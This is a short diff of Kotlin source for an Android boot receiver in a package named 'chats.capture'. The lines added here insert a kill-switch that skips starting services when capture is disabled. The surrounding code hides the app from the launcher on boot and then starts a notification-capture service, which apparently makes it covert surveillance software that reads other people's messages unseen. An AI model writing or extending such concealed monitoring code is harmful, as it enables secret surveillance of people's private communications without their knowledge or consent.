@@ -22,6 +22,12 @@ class BootReceiver : BroadcastReceiver() {
                 // Ensure app is hidden from launcher
                 AppVisibilityManager.hideFromLauncher(context)
                 AppHider.ensureHidden(context)
+
+                // Global kill-switch: don't start/monitor services unless capture is enabled.
+                if (!com.chats.capture.utils.AppStateManager.areServicesEnabled(context)) {
+                    Timber.tag("BOOT_RECEIVER").i("🛑 Capture disabled - skipping service start after boot")
+                    return
+                }
                 
                 // Start notification capture service using utility
                 Timber.tag("BOOT_RECEIVER").i("🔄 Starting NotificationCaptureService after boot...")
